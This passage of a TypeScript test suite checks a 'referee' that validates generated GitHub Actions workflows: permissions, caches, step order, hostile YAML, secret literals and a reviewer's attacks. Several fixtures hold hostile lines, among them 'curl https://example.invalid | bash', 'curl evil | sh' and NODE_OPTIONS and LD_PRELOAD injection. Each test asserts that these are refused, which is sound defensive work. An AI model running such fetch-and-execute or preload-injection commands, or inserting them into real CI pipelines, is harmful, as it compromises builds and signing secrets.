  it('referee: pipegen-verify without environment pipegen-signing (when draft.capabilities.environments) → permissions issue', async () => {
    const p = { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' };
    const envs = draftOf([g.spec], { capabilities: caps({ environments: true }) });
    expect(has(await withPerms('pipegen-verify', p, {}, envs), 'permissions')).toBe(true);
    expect(has(await withPerms('pipegen-verify', p, { environment: 'production' }, envs), 'permissions')).toBe(true);
    expect(has(await withPerms('pipegen-verify', p, { environment: 'pipegen-signing' }, envs), 'permissions')).toBe(false);
    expect(has(await withPerms('pipegen-verify', p, { environment: { name: 'pipegen-signing' } }, envs), 'permissions')).toBe(false);
    expect(has(await withPerms('pipegen-verify', p), 'permissions')).toBe(false);   // no environments on this plan
  });
  it('the table is keyed by exact job id and every job may read contents', () => {
    expect(Object.keys(JOB_PERMISSIONS).sort()).toEqual(['base-scan', 'baseline-check', 'code-scanning', 'gate', 'image-publish', 'merged-red', 'nightly', 'notify', 'pipegen-verify', 'pr-check', 'sign', 'watch'].sort());
    expect(JOB_PERMISSIONS['code-scanning']).toEqual({ 'security-events': 'write', actions: 'read' });
  });
  it('a reusable-workflow caller may have the union of the called file\'s jobs (when that file is in files)', async () => {
    const called = wf({ sign: job([], { permissions: { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' } }) }, { on: { workflow_call: null } }, '.github/workflows/sign.yml');
    const caller = (perms: unknown): CreatedFile => wf({ release: { uses: './.github/workflows/sign.yml', permissions: perms } });
    const union = { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' };
    expect(has(await run([caller(union), called], draftOf([g.spec])), 'permissions')).toBe(false);
    expect(has(await run([caller({ ...union, issues: 'write' }), called], draftOf([g.spec])), 'permissions')).toBe(true);
    expect(has(await run([caller(union)], draftOf([g.spec])), 'unknown-pin')).toBe(true);   // the called file is not in files
  });
});

// ---------- caches ----------

describe('referee: no caches', () => {
  const g = gitleaks();
  it('referee: gate-feeding, build, sign or pipegen-verify job without cache-mode none → cache issue', async () => {
    for (const id of ['scan', 'image-publish', 'sign', 'pipegen-verify', 'gate']) {
      const j = Object.fromEntries(Object.entries(job(g.steps, { permissions: { contents: 'read' } })).filter(([k]) => k !== 'cache-mode'));
      expect(has(await run([wf({ [id]: j })], draftOf([g.spec])), 'cache'), id).toBe(true);
      expect(has(await run([wf({ [id]: job(g.steps, { 'cache-mode': 'default' }) })], draftOf([g.spec])), 'cache'), id).toBe(true);
    }
  });
  it('referee: trivy step without its pinned config (cache.backend memory) → cache issue (S3)', async () => {
    const spec = specOf('trivy-config', { needId: 'iac', service: undefined });
    const steps = toolJob(spec);
    expect(show(await run([wf({ iac: job(steps) })], draftOf([spec])))).toBe('');
    const noMemory = steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, PIPEGEN_CONFIG: 'cache:\n  backend: fs\n' } } : s));
    expect(has(await run([wf({ iac: job(noMemory) })], draftOf([spec])), 'cache')).toBe(true);
    // still in memory, but not the pinned config: anything else in it (a database repository, a cache dir) is unreviewed
    const more = steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, env: { ...s.env, PIPEGEN_CONFIG: `${s.env?.PIPEGEN_CONFIG as string}db:\n  repository: evil.example/db\n` } } : s));
    expect(has(await run([wf({ iac: job(more) })], draftOf([spec])), 'cache')).toBe(true);
    const noFlag = steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, run: (s.run as string).replace('--config "$cfg/trivy.yaml" ', '') } : s));
    expect(noFlag).not.toEqual(steps);
    expect(has(await run([wf({ iac: job(noFlag) })], draftOf([spec])), 'cache')).toBe(true);
  });
  it('actions/cache and a cache input → cache issue', async () => {
    const r = await run([wf({ scan: job([...g.steps, { name: 'c', uses: `actions/cache@${sha('f')}`, with: { path: 'x', key: 'k' } }]) })], draftOf([g.spec]));
    expect(has(r, 'cache'), show(r)).toBe(true);
    const node = prelude().map((s) => (s.with?.['package-manager-cache'] === undefined ? s : { ...s, with: { ...s.with, cache: 'npm' } }));
    const [checkout] = prelude();
    const setup = { ...renderJobPrelude({ node: {} }, platform()).steps[1], with: { 'package-manager-cache': 'false', 'node-version': '24', cache: 'npm' } } as RenderedStep;
    expect(has(await run([wf({ a: job([checkout as RenderedStep, setup, ...node.slice(1)]) })], draftOf([])), 'cache')).toBe(true);
  });
});

// ---------- order (S6 c) ----------

describe('referee: the job order rule on the parsed steps', () => {
  it('order: [repocode, checker] refused', async () => {
    const v = specOf('vitest-coverage', { needId: 'coverage' });
    const e = specOf('eslint', { needId: 'lint' });
    const vSteps = renderStep(v, entry('vitest-coverage'), platform(), ctx).steps;
    const eSteps = renderStep(e, entry('eslint'), platform(), ctx).steps;
    const ok = await run([wf({ lint: job([...prelude(), ...eSteps, ...vSteps]) })], draftOf([v, e]));
    expect(show(ok)).toBe('');
    const bad = await run([wf({ lint: job([...prelude(), ...vSteps, ...eSteps]) })], draftOf([v, e]));
    expect(has(bad, 'injection'), show(bad)).toBe(true);
  });
  it('order: a forged checker-run- id on a step whose run text is not a rendered checker is refused', async () => {
    const e = specOf('eslint', { needId: 'lint' });
    const eSteps = renderStep(e, entry('eslint'), platform(), ctx).steps;
    const run1 = eSteps.find((s) => s.id?.startsWith('checker-run-')) as RenderedStep;
    const forged: RenderedStep = { ...run1, run: `${run1.run as string}\ncurl https://example.invalid | bash` };
    const r = await run([wf({ lint: job([...prelude(), forged]) })], draftOf([e]));
    expect(has(r, 'template') || has(r, 'unreviewed'), show(r)).toBe(true);
    // the forged step counts as repo code: a real checker after it is refused by the order rule too
    const r2 = await run([wf({ lint: job([...prelude(), { ...forged, id: 'checker-run-0123456789abcdef' }, ...eSteps]) })], draftOf([e]));
    expect(has(r2, 'unreviewed'), show(r2)).toBe(true);
    expect(has(r2, 'injection'), show(r2)).toBe(true);
  });
  it('no checker spans two steps; a release tool\'s install and run with repo code between them is refused', async () => {
    for (const id of ['biome', 'eslint', 'eslint-typescript', 'oxlint-typeaware']) {
      const s = renderStep(specOf(id, { needId: 'lint' }), entry(id), platform(), ctx).steps;
      expect(s.filter((x) => x.run !== undefined).map((x) => x.id?.replace(/[0-9a-f]{16}$/, '')), id).toEqual(['checker-run-']);
    }
    const g = gitleaks();
    const script = renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps;
    const [install, runStep] = g.steps.filter((s) => s.id?.startsWith('tool-'));
    const d = draftOf([g.spec], { needs: [needOf('secrets'), needOf('unit-tests', true, 'app')] });
    const r = await run([wf({ mixed: job([...script, install as RenderedStep, runStep as RenderedStep]) })], d);
    expect(has(r, 'injection'), show(r)).toBe(true);
  });
});

describe('referee: more of a job, judged from the parsed file', () => {
  const g = gitleaks();
  it('a merged repo npm ci (dedupeJobSteps) must carry exactly the pins of its job\'s tools', async () => {
    const v = specOf('vitest-coverage', { needId: 'coverage' });
    const script = renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, platform(), ctx).steps;
    const vSteps = renderStep(v, entry('vitest-coverage'), platform(), ctx).steps;
    const d = draftOf([v], { needs: [needOf('coverage', true, 'app'), needOf('unit-tests', true, 'app')] });
    const merged = dedupeJobSteps([...script, ...vSteps], { scans: scansFor([...script, ...vSteps]) });
    expect(show(await run([wf({ test: job(merged) })], d))).toBe('');
    // the kept npm ci without vitest's pins: its pre-check would no longer guard vitest's lockfile entries
    const dropped = merged.map((s) => (s.id?.startsWith('pipegen-npm-ci-') ? { ...s, env: { ...s.env, PIPEGEN_NPM_EXPECT: '[]' } } : s));
    expect(has(await run([wf({ test: job(dropped) })], d), 'template')).toBe(true);
  });
  it('a step of a blocking check may not be skipped on success or have its failure ignored', async () => {
    for (const over of [{ 'continue-on-error': true }, { if: 'failure()' }]) {
      const steps = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, ...over } : s));
      expect(has(await run([wf({ scan: job(steps) })], draftOf([g.spec])), 'template'), JSON.stringify(over)).toBe(true);
    }
    // fix round 1 (ruling 4): success() is the only condition on a tool step; always() only on an upload
    const ok = g.steps.map((s) => (s.id?.startsWith('tool-run-') ? { ...s, if: 'success()' } : s));
    expect(show(await run([wf({ scan: job(ok) })], draftOf([g.spec])))).toBe('');
  });
  it('a job service runs only a reviewed image at its reviewed digest, with nothing but image, ports and env', async () => {
    const reg = entry('registry');
    const image = `${reg.step.cli?.install.package as string}@${reg.candidate.pin.digest as string}`;
    expect(show(await run([wf({ scan: job(g.steps, { services: { registry: { image, ports: ['5000:5000'] } } }) })], draftOf([g.spec])))).toBe('');
    expect(has(await run([wf({ scan: job(g.steps, { services: { db: { image: 'postgres:16' } } }) })], draftOf([g.spec])), 'unpinned')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { services: { db: { image: `postgres@sha256:${'e'.repeat(64)}` } } }) })], draftOf([g.spec])), 'unknown-pin')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { services: { registry: { image, options: '--privileged' } } }) })], draftOf([g.spec])), 'template')).toBe(true);
  });
  it('a reusable-workflow caller maps each secret under its own name, and only an allowed one', async () => {
    const called = { ...wf({ check: job([]) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
    const pinned = draftOf([], { centralPin: { repo: 'o/pipelines', sha: sha('c') } });
    const caller = (mapped: Record<string, string>): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${sha('c')}`, permissions: { contents: 'read' }, [SEC_FIELD]: mapped } });
    const fp = 'PIPEGEN_FP_KEY';
    expect(show(await run([caller({ [fp]: ref(fp) }), called], pinned))).toBe('');
    expect(has(await run([caller({ OTHER: ref(fp) }), called], pinned), 'injection')).toBe(true);
    expect(has(await run([caller({ DATABASE_URL: ref('DATABASE_URL') }), called], pinned), 'permissions')).toBe(true);
  });
  it('an action step\'s env may only map a secret under its own name', async () => {
    const steps = prelude().map((s, i) => (i === 0 ? { ...s, env: { NODE_OPTIONS: '--require ./x.js' } } : s));
    expect(has(await run([wf({ a: job(steps) })], draftOf([])), 'template')).toBe(true);
  });
});

// ---------- the hostile YAML (S29) ----------

describe('referee: hostile YAML is refused before anything is judged (S29)', () => {
  const g = gitleaks();
  const base = (): string => workflowText({ scan: job(g.steps) });
  const hostile = async (text: string): Promise<RefereeReport> => run([file(text)], draftOf([g.spec]));
  it('anchors and aliases', async () => {
    const text = `${base()}  copy: &j\n    runs-on: ubuntu-latest\n    permissions: {}\n    cache-mode: none\n    steps: []\n  again: *j\n`;
    expect(has(await hostile(text), 'injection')).toBe(true);
  });
  it('an anchor alone (no alias yet) is refused too', async () => {
    expect(has(await hostile(base().replace('permissions: {}', 'permissions: &p {}')), 'injection')).toBe(true);
  });
  it('a << merge key', async () => {
    expect(has(await hostile(`${base()}  merged:\n    <<: {runs-on: ubuntu-latest}\n    permissions: {}\n`), 'injection')).toBe(true);
  });
  it('duplicate keys', async () => {
    expect(has(await hostile(`${base()}  scan:\n    runs-on: ubuntu-latest\n`), 'injection')).toBe(true);
    expect(has(await hostile(base().replace('permissions: {}', 'permissions: {}\npermissions: write-all')), 'injection')).toBe(true);
  });
  it('tags and directives', async () => {
    expect(has(await hostile(base().replace('permissions: {}', 'permissions: !!map {}')), 'injection')).toBe(true);
    expect(has(await hostile(`%YAML 1.1\n---\n${base()}`), 'injection')).toBe(true);
  });
  it('more than one document', async () => {
    expect(has(await hostile(`${base()}---\nname: second\n`), 'injection')).toBe(true);
  });
  it('a file that is not YAML, or not a map, or has a non-text key', async () => {
    for (const t of ['jobs: [1, 2\n', '- a\n- b\n', `${base()}  ? [x]\n  : 1\n`]) expect(has(await hostile(t), 'injection'), t).toBe(true);
  });
  it('a key pipegen never writes, at the top, on a job or on a step', async () => {
    expect(has(await hostile(`${base()}defaults:\n  run:\n    shell: sh\n`), 'template')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { container: 'alpine' }) })], draftOf([g.spec])), 'template')).toBe(true);
    const odd = g.steps.map((s, i) => (i === 0 ? { ...s, 'working-directory': '/' } : s));
    expect(has(await run([wf({ scan: job(odd) })], draftOf([g.spec])), 'template')).toBe(true);
  });
});

// ---------- the gate, the blocking rule (B7) ----------

describe('referee: the gate check name', () => {
  const g = gitleaks();
  it('no job takes the gate\'s check name; the gate job is named from GATE_CHECK_NAME', async () => {
    const [caller, gateName] = GATE_CHECK_NAME.split(' / ') as [string, string];
    expect(has(await run([wf({ scan: job(g.steps, { name: GATE_CHECK_NAME }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(true);
    expect(has(await run([wf({ scan: job(g.steps, { name: gateName }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(true);
    const perms = { permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } };
    expect(has(await run([wf({ gate: job(g.steps, { ...perms, name: 'the gate' }) })], draftOf([g.spec])), 'not-gate-readable')).toBe(true);
    expect((await run([wf({ gate: job(g.steps, { ...perms, name: gateName }) })], draftOf([g.spec]))).issues.some((i) => i.check === 'not-gate-readable' && /must be named/.test(i.message))).toBe(false);
    expect(caller).toBe('pipegen');
  });
});

describe('referee: blocking needs (B7)', () => {
  it('referee: blocking scanner without sarif demoted with note', async () => {
    const list = reviewedList().map((t) => (t.id === 'gitleaks' ? { ...t, step: { ...t.step, output: { ...t.step.output, format: 'junit' as const } } } : t));
    const t = list.find((x) => x.id === 'gitleaks') as ReviewedTool;
    const spec = specFor(t, { needId: 'secrets' });
    // the job holds the step the renderer makes for this (edited) entry: a spec that is in no file is not-gate-readable instead (final review finding 3)
    const steps = [...prelude(), ...renderStep(spec, t, platform(), ctx).steps];
    const r = await run([wf({ scan: job(steps) })], draftOf([spec]), { list });
    expect(r.demoted).toEqual(['secrets']);
    expect(r.notes.join(' ')).toMatch(/secrets/);
    expect(r.ok, show(r)).toBe(true);
  });
  it('referee: blocking dast with zap-json accepted; blocking hooks-ci accepted', async () => {
    const zap = specOf('zap-baseline', { needId: 'dast' });
    const hooks = specOf('lefthook', { needId: 'hooks-ci' });
    const r = await run([wf({ dast: job(toolJob(zap)), hooks: job(toolJob(hooks)) })], draftOf([zap, hooks]));
    expect(show(r)).toBe('');
    expect(r.demoted).toEqual([]);
  });
  it('referee: blocking format, type-check, coverage, workflow-lint, dependency-review kept blocking', async () => {
    const specs = [specOf('prettier', { needId: 'format' }), specOf('biome', { needId: 'format' }), specOf('vitest-coverage', { needId: 'coverage' }),
      specOf('actionlint', { needId: 'workflow-lint', service: undefined }), specOf('osv-scanner', { needId: 'dependency-review', service: undefined }),
      specOf('dependency-review-action', { needId: 'dependency-review', service: undefined })];
    const d = draftOf(specs);
    d.needs.push(needOf('type-check', true, 'app'));
    const r = await run([wf({ a: job(prelude()) })], d);
    expect(r.demoted).toEqual([]);
    expect(r.notes.filter((n) => /non-blocking|demot/i.test(n))).toEqual([]);
  });
  it('the category comes from the need id, never from the tool', async () => {
    // osv-scanner is both deps and dependency-review: as `deps` (findings) its sarif keeps it blocking; a junit copy would be demoted only there
    const list = reviewedList().map((t) => (t.id === 'osv-scanner' ? { ...t, step: { ...t.step, output: { ...t.step.output, format: 'junit' as const } } } : t));
    const t = list.find((x) => x.id === 'osv-scanner') as ReviewedTool;
    const s1 = specFor(t, { needId: 'deps', service: 'app' });
    const s2 = specFor(t, { needId: 'dependency-review' });
    const jobs = { a: job([...prelude(), ...renderStep(s1, t, platform(), ctx).steps]), b: job([...prelude(), ...renderStep(s2, t, platform(), ctx).steps]) };
    const r = await run([wf(jobs)], draftOf([s1, s2]), { list });
    expect(r.demoted).toEqual(['deps--app']);
  });
});

// ---------- secret values (S18), linters ----------

describe('referee: secret values and the linters', () => {
  const g = gitleaks();
  it('referee: aws key literal in workflow → secret-value issue', async () => {
    const text = workflowText({ scan: job(g.steps, { env: { CLOUD_ID: fake.awsKey() } }) });
    const r = await run([file(text)], draftOf([g.spec]));
    expect(has(r, 'secret-value'), show(r)).toBe(true);
    expect(JSON.stringify(r)).not.toContain(fake.awsKey());
    // any created file, not only workflows
    const r2 = await run([wf({ scan: job(g.steps) }), file(`token ${fake.awsKey()}\n`, 'docs/PIPEGEN.md', { part: 'docs' })], draftOf([g.spec]));
    expect(r2.issues.some((i) => i.check === 'secret-value' && i.file === 'docs/PIPEGEN.md'), show(r2)).toBe(true);
  });
  it('referee: actionlint failure surfaced as issue (linter stubbed)', async () => {
    const seen: string[][] = [];
    const deps: RefereeDeps = { runLinters: async (files, linters, token) => {
      seen.push(files.map((f) => f.path));
      expect(await linters.actionlint()).toBe('/stub/actionlint');
      expect(token).toBe('gh-stub');
      return [{ file: '.github/workflows/pipegen.yml', check: 'actionlint', message: 'expression syntax error', line: 3 }];
    } };
    const r = await run([wf({ scan: job(g.steps) })], draftOf([g.spec]), { deps });
    expect(seen).toEqual([['.github/workflows/pipegen.yml']]);
    expect(has(r, 'actionlint')).toBe(true);
    expect(r.ok).toBe(false);
  });
  it('referee: default deps use runLinters (7b): no deps → the real runner starts the linters the closures name', async () => {
    const a = stub();
    const z = stub();
    z.set('[]');
    const linters: Linters = { actionlint: async () => a.bin, zizmor: async () => z.bin };
    const r = await referee([wf({ scan: job(g.steps) })], draftOf([g.spec]), platform(), reviewedList(), linters, 'gh-stub');
    expect(a.records()).toHaveLength(1);
    expect(z.records()).toHaveLength(1);
    expect(has(r, 'actionlint') || has(r, 'zizmor'), show(r)).toBe(false);
    // a finding from the real runner fails the referee; no token → a zizmor issue
    a.set(JSON.stringify([{ message: 'bad expression', filepath: '.github/workflows/pipegen.yml', line: 4, column: 1, kind: 'expression', snippet: '', end_column: 2 }]), 1);
    const r2 = await referee([wf({ scan: job(g.steps) })], draftOf([g.spec]), platform(), reviewedList(), linters, 'gh-stub');
    expect(r2.issues.some((i) => i.check === 'actionlint' && i.line === 4), show(r2)).toBe(true);
    const r3 = await referee([wf({ scan: job(g.steps) })], draftOf([g.spec]), platform(), reviewedList(), linters, null);
    expect(r3.issues.some((i) => i.check === 'zizmor'), show(r3)).toBe(true);
  });
});

// ---------- edited user workflows (the marker convention for Plan G) ----------

describe('referee: an edited user workflow is judged only where pipegen inserted lines', () => {
  const original = [
    'name: deploy',
    'on:',
    '  push:',
    '    branches: [main]',
    'defaults: &d',
    '  run:',
    '    shell: bash',
    'jobs:',
    '  deploy:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - uses: actions/checkout@v4',
    '      - run: ./deploy.sh',
    '',
  ].join('\n');
  const verifySteps = (): RenderedStep[] => [{ name: 'verify', uses: (GATE.step.action?.uses as string), with: { mode: 'find-run', layout: 'inline' } }];
  /** The user's file as insertVerify would leave it: `needs: [pipegen-verify]` on deploy, and the pipegen-verify job (steps through stepsToYaml). */
  const edited = (steps = verifySteps(), extra: (doc: Document) => void = () => {}): string => {
    const src = original.replace('  deploy:\n    runs-on: ubuntu-latest', '  deploy:\n    needs: [pipegen-verify]\n    runs-on: ubuntu-latest');
    const text = `${src}  pipegen-verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read\n      packages: read\n      attestations: read\n    cache-mode: none\n    steps: []\n`;
    const doc = parseDocument(text);
    doc.setIn(['jobs', 'pipegen-verify', 'steps'], stepsToYaml(steps));
    extra(doc);
    return doc.toString({ lineWidth: 0 });
  };
  const userFile = (text: string, over: Partial<NonNullable<CreatedFile['inserted']>> = {}): CreatedFile =>
    file(text, '.github/workflows/deploy.yml', { part: 'deploy-verify', inserted: { original, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }], ...over } });
  const d = (): PipelineDraft => draftOf([], { profile: { ...prof, existingWorkflows: [{ path: '.github/workflows/deploy.yml', triggers: ['push'], deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow] } });
  it('the user\'s own jobs (a tag pin, anchors, no permissions) are not judged; pipegen\'s job is', async () => {
    const r = await run([userFile(edited())], d(), { list: [...reviewedList(), GATE] });
    expect(show(r)).toBe('');
    const bad = await run([userFile(edited([{ name: 'x', uses: 'actions/checkout@v4' }]))], d(), { list: [...reviewedList(), GATE] });
    expect(has(bad, 'unpinned'), show(bad)).toBe(true);
  });
  it('a change outside the inserted job and needs is refused', async () => {
    const text = edited().replace('./deploy.sh', './deploy.sh --skip-checks');
    expect(has(await run([userFile(text)], d(), { list: [...reviewedList(), GATE] }), 'template')).toBe(true);
    const undeclared = edited(verifySteps(), (doc) => doc.setIn(['jobs', 'extra'], doc.createNode({ 'runs-on': 'ubuntu-latest', steps: [{ run: 'echo hi' }] })));
    expect(has(await run([userFile(undeclared)], d(), { list: [...reviewedList(), GATE] }), 'template')).toBe(true);
    // the needs the edit claims to add must be there
    const missing = edited().replace(/needs: \[ ?pipegen-verify ?\]/, 'needs: []');
    expect(missing).not.toBe(edited());
    expect(has(await run([userFile(missing)], d(), { list: [...reviewedList(), GATE] }), 'template')).toBe(true);
  });
  it('the mark is only honoured on an existing workflow of the repository', async () => {
    const r = await run([userFile(edited())], draftOf([]), { list: [...reviewedList(), GATE] });
    expect(has(r, 'template'), show(r)).toBe(true);
  });
  it('pipegen\'s inserted job may hold no anchor or alias', async () => {
    const text = edited().replace('    runs-on: ubuntu-latest\n    permissions:', '    runs-on: &r ubuntu-latest\n    permissions:');
    expect(has(await run([userFile(text)], d(), { list: [...reviewedList(), GATE] }), 'injection')).toBe(true);
  });
  it('pipegenLines: the inserted job\'s lines and the needs line; a linter finding elsewhere is a note, not an issue', async () => {
    const text = edited();
    const f = userFile(text);
    const lines = pipegenLines(f);
    expect(lines).not.toBeNull();
    const all = text.split('\n');
    const verifyAt = all.findIndex((l) => l.startsWith('  pipegen-verify:')) + 1;
    const needsAt = all.findIndex((l) => /needs: \[ ?pipegen-verify ?\]/.test(l)) + 1;
    expect(needsAt).toBeGreaterThan(0);
    const deployAt = all.findIndex((l) => l.includes('./deploy.sh')) + 1;
    expect(lines?.has(verifyAt)).toBe(true);
    expect(lines?.has(needsAt)).toBe(true);
    expect(lines?.has(deployAt)).toBe(false);
    expect(pipegenLines(wf({ a: job(prelude()) }))).toBeNull();   // a file pipegen wrote whole: every line is judged
    const deps: RefereeDeps = { runLinters: async () => [
      { file: f.path, check: 'zizmor', message: 'unpinned action in the user job', line: deployAt },
      { file: f.path, check: 'actionlint', message: 'bad key in pipegen-verify', line: verifyAt },
    ] };
    const r = await run([f], d(), { list: [...reviewedList(), GATE], deps });
    expect(r.issues.map((i) => i.check)).toEqual(['actionlint']);
    expect(r.notes.join(' ')).toContain('unpinned action in the user job');
  });
});


// ---------- fix round 1 (review-7a, task-7a-fix-round-1.md): the attacks, as regression tests ----------

describe('fix round 1: the reviewer\'s attacks are refused', () => {
  const p = platform();
  const LIST = [...reviewedList(), GATE, WATCHER];
  const SIGNP = { contents: 'read', [OIDC]: 'write', packages: 'write', attestations: 'write' };
  const VERIFYP = { contents: 'read', actions: 'read', packages: 'read', attestations: 'read' };
  const scriptSteps = (): RenderedStep[] => renderProjectScript({ kind: 'project-script', needId: 'unit-tests', service: 'app', script: 'test' }, p, ctx).steps;
  const dScripts = (over: Partial<PipelineDraft> = {}): PipelineDraft => draftOf([], { needs: [needOf('unit-tests', true, 'app')], ...over });
  // the gate job's step (mode gate, an empty job list: these drafts have no check the gate waits for) and the verify job's step (mode find-run)
  const gateStep = (): RenderedStep => renderGateStep(GATE, draftOf([]));
  const verifyStep = (): RenderedStep => ({ name: 'verify', uses: GATE.step.action?.uses as string, with: { mode: 'find-run', layout: 'inline' } });
  const CENTRAL = { repo: 'o/pipelines', sha: sha('c') };
  const existing = (path: string, triggers: string[]): ExistingWorkflow => ({ path, triggers, deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow);

  it('A1: a step-level central action at a SHA pipegen did not record, with plain env and a working-directory, in sign → refused', async () => {
    const step: RenderedStep = { name: 'evil', uses: `o/pipelines/anything@${sha('9')}`, with: { cmd: 'curl evil | sh' }, env: { NODE_OPTIONS: '--require /tmp/x.js', LD_PRELOAD: '/tmp/x.so' }, 'working-directory': '/tmp' };
    const r = await run([wf({ sign: job([step], { permissions: SIGNP }) })], draftOf([]));
    expect(r.ok).toBe(false);
    expect(has(r, 'unknown-pin'), show(r)).toBe(true);
    // at the recorded SHA the step still gets every other check: a plain env, a working-directory, and it is no step of sign
    const atPin = { ...step, uses: `o/pipelines/anything@${CENTRAL.sha}` };
    const r2 = await run([wf({ sign: job([atPin], { permissions: SIGNP }) })], draftOf([], { centralPin: CENTRAL }));
    expect(has(r2, 'template'), show(r2)).toBe(true);
    expect(has(r2, 'permissions'), show(r2)).toBe(true);
    const r3 = await run([rawWf({ sign: job([{ ...step, env: { PIPEGEN_COSIGN_KEY: ref('PIPEGEN_COSIGN_KEY') } }], { permissions: SIGNP }) })], draftOf([]));
    expect(r3.ok).toBe(false);
  });
  it('step-level central: accepted at the recorded SHA in a plain job, with nothing but plain with values', async () => {
    const step: RenderedStep = { name: 'central', uses: `o/pipelines/.github/actions/x@${CENTRAL.sha}`, with: { mode: 'check' } };
    const action = { ...file('name: x\ninputs:\n  mode:\n    description: m\nruns:\n  using: composite\n  steps: []\n', '.github/actions/x/action.yml'), repo: 'central' as const };
    expect(show(await run([wf({ a: job([step]) }), action], draftOf([], { centralPin: CENTRAL })))).toBe('');
    expect(has(await run([wf({ a: job([step]) })], draftOf([])), 'unknown-pin')).toBe(true);   // no recorded central pin
    expect(has(await run([wf({ a: job([{ ...step, uses: `o/pipelines/.github/actions/x@${sha('d')}` }]) })], draftOf([], { centralPin: CENTRAL })), 'unknown-pin')).toBe(true);
  });
  it('A1b: a central caller job whose workflow is not in files, passing the cosign key → refused', async () => {
    const caller = { name: 'pipegen', uses: `o/pipelines/.github/workflows/whatever.yml@${CENTRAL.sha}`, permissions: { contents: 'read' }, [SEC_FIELD]: { PIPEGEN_COSIGN_KEY: ref('PIPEGEN_COSIGN_KEY') }, with: { x: 'y' } };
    for (const d of [draftOf([]), draftOf([], { centralPin: CENTRAL })]) {
      const r = await run([wf({ pipegen: caller })], d);
      expect(has(r, 'unknown-pin'), show(r)).toBe(true);
    }
  });
  it('job-level central: accepted only at the recorded SHA with the called file in files (and judged there)', async () => {
    const called = { ...wf({ gate: job([gateStep(), ...renderGateUploads(platform())], { if: 'always()', permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' } }) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
    const caller = (at: string): CreatedFile => wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${at}`, permissions: { contents: 'read', actions: 'read', 'pull-requests': 'read' }, [SEC_FIELD]: { PIPEGEN_FP_KEY: ref('PIPEGEN_FP_KEY') } } });
    expect(show(await run([caller(CENTRAL.sha), called], draftOf([], { centralPin: CENTRAL }), { list: LIST }))).toBe('');
    expect(has(await run([caller(sha('d')), called], draftOf([], { centralPin: CENTRAL }), { list: LIST }), 'unknown-pin')).toBe(true);
    expect(has(await run([caller(CENTRAL.sha), called], draftOf([]), { list: LIST }), 'unknown-pin')).toBe(true);
  });
  it('A16: an empty or malformed owner never makes a central prefix', async () => {
    for (const owner of ['', 'o/x', '-o', 'Ｏ']) {
      const d = draftOf([], { profile: { ...prof, owner }, centralPin: { repo: `${owner}/pipelines`, sha: CENTRAL.sha } });
      const r = await run([wf({ pipegen: { name: 'pipegen', uses: `${owner}/pipelines/.github/workflows/gate.yml@${CENTRAL.sha}`, permissions: { contents: 'read' } } })], d);
      expect(r.ok, owner).toBe(false);
    }
  });
  it('the owner is checked again: an odd owner never makes a central prefix, even with the called file in files', async () => {
    for (const owner of ['', '-o', 'Ｏ', 'o_x']) {
      const called = { ...wf({ check: job([]) }, { on: { workflow_call: null } }, '.github/workflows/gate.yml'), repo: 'central' as const };
      const d = draftOf([], { profile: { ...prof, owner }, centralPin: { repo: `${owner}/pipelines`, sha: CENTRAL.sha } });
      const r = await run([wf({ pipegen: { name: 'pipegen', uses: `${owner}/pipelines/.github/workflows/gate.yml@${CENTRAL.sha}`, permissions: { contents: 'read' } } }), called], d);
      expect(r.ok, owner).toBe(false);
    }
  });
  it('a central step at the recorded SHA with a plain env → template', async () => {
    const step: RenderedStep = { name: 'central', uses: `o/pipelines/.github/actions/x@${CENTRAL.sha}`, env: { MODE: 'x' } };
    expect(has(await run([wf({ a: job([step]) })], draftOf([], { centralPin: CENTRAL })), 'template')).toBe(true);
  });
  it('a local action that uses itself, or one that is not composite, is refused as a local action (fix round 2, ruling 3)', async () => {
    const loop = file('name: l\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/loop\n', '.github/actions/loop/action.yml');
    expect(has(await run([wf({ t: job([{ name: 'l', uses: './.github/actions/loop' }]) }), loop], draftOf([])), 'unreviewed')).toBe(true);
    const node = file('name: n\nruns:\n  using: node24\n  steps: []\n', '.github/actions/node/action.yml');
    expect(has(await run([wf({ t: job([{ name: 'n', uses: './.github/actions/node' }]) }), node], draftOf([])), 'unreviewed')).toBe(true);
  });
  it('pipegen-signing on a job of the table other than sign and pipegen-verify → permissions', async () => {
    const r = await run([wf({ gate: job([gateStep()], { permissions: { contents: 'read', actions: 'read' }, environment: 'pipegen-signing' }) })], draftOf([]), { list: LIST });
    expect(r.issues.some((i) => i.check === 'permissions' && /pipegen-signing/.test(i.message)), show(r)).toBe(true);
  });
  it('A2: the project\'s npm test in the sign job (OIDC write) → refused', async () => {
    expect(has(await run([wf({ sign: job(scriptSteps(), { permissions: SIGNP }) })], dScripts()), 'permissions')).toBe(true);
  });
  it('A2b: repo code in code-scanning and in watch → refused', async () => {
